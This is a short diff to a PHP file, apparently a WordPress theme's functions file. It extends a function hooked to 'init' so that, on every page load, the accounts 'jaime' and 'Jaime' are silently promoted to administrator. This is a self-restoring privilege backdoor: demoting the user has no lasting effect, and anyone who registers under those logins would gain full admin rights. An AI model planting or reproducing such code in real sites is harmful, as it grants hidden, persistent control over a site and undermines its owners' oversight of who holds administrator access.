@@ -393,13 +393,16 @@ function fcb_social_links() {
 }
 
 /**
- * Recuperar privilegios de administrador únicamente para el usuario 'jaime'.
+ * Recuperar privilegios de administrador únicamente para el usuario 'jaime' o 'Jaime'.
  */
 function fcb_restore_admin_privileges() {
-	// Promover únicamente por nombre de usuario 'jaime'
-	$user_jaime = get_user_by( 'login', 'jaime' );
-	if ( $user_jaime && ! in_array( 'administrator', (array) $user_jaime->roles ) ) {
-		$user_jaime->set_role( 'administrator' );
+	// Promover únicamente por nombre de usuario 'jaime' o 'Jaime'
+	$usernames = array( 'jaime', 'Jaime' );
+	foreach ( $usernames as $username ) {
+		$user = get_user_by( 'login', $username );
+		if ( $user && ! in_array( 'administrator', (array) $user->roles ) ) {
+			$user->set_role( 'administrator' );
+		}
 	}
 }
 add_action( 'init', 'fcb_restore_admin_privileges' );
